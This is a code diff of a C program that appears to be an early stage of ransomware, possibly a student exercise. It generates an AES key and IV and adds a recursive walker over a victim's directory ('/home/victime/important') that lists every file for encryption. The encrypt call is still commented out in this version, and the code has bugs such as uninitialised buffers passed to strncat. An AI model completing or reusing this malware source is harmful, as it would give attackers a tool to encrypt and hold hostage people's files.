@@ -23,13 +23,12 @@ int main (int argc, char * argv[])
 	printf("Bon travail!\n");
 	unsigned char key[33];
     int sizeKey = 33;
-    unsigned char iv[17];
-    int sizeIv = 17;
+    unsigned char iv[33];
+    int sizeIv = 33;
     char pKey[65];
-    char pIv[33];
+    char pIv[65];
 	int status = generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
-	printf("%d\n", status);
-	printf("%s", key);
+	listdir("/home/victime/important", iv, key, 'e');
 }
 
 int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
@@ -38,4 +37,49 @@ int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,
 	RAND_priv_bytes(iv, sizeIv);
 	bytes_to_hexa(key, pKey,sizeKey );
 	bytes_to_hexa(iv, pIv, sizeKey);
+}
+
+void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
+{
+	DIR *dp = opendir(name);
+	struct dirent *dirp;
+
+	while((dirp = readdir(dp)) != NULL)
+    {
+        if(dirp->d_type==DT_DIR && strcmp("..",dirp->d_name) != 0 && strcmp(".",dirp->d_name) != 0 )
+        {
+            //printf("%s\n", dirp->d_name);
+            char *newPath = (char*)malloc(strlen(name)+strlen(dirp->d_name)+2);
+            strncat(newPath,name,strlen(name));
+            strncat(newPath,"/",2);
+            strncat(newPath,dirp->d_name,strlen(dirp->d_name));
+            //printf("%s\n", newPath);
+            listdir(newPath,iv, key, 'e');
+            
+            
+            
+        }
+        else if(strcmp("..",dirp->d_name) != 0 && strcmp(".",dirp->d_name) != 0)
+        {
+
+            char *filePath = (char*)malloc(strlen(name)+strlen(dirp->d_name)+2);
+            strncat(filePath,name,strlen(name));
+            strncat(filePath,"/",2);
+            strncat(filePath,dirp->d_name,strlen(dirp->d_name));
+            printf("%s\n",filePath);
+            //encrypt(key, iv, filePath);
+            //free(filePath);
+            
+
+            
+
+        }
+
+
+
+
+    }
+
+
+
 }
